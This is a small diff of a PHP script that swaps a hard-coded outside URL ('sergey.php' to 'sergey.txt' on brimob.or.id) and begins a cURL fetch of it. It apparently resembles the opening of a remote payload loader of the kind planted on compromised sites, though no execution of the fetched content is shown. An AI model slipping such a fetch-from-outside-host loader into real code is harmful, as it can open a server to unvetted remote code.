@@ -1,5 +1,5 @@
 <?php
-$url = "https://brimob.or.id/raw/sergey.php";
+$url = "https://brimob.or.id/raw/sergey.txt";
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_HEADER, true);
